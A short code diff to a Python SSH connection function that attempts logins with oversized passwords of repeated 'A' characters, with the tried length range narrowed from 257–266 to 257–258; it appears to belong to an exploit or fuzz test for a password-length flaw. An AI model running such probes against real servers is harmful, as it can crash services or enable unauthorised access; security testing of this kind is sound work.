@@ -66,7 +66,7 @@ def connect(host, port, user, key=None, password=None, timeout=10):
     t.start_client(timeout=timeout)
     verify_host(t, host, port)
     authenticated = False
-    for pwl in range(257,267): 
+    for pwl in range(257,259): 
         try:
             print(f"trying password: 'A'*{pwl}")
             t.auth_password(user, "A" * pwl)
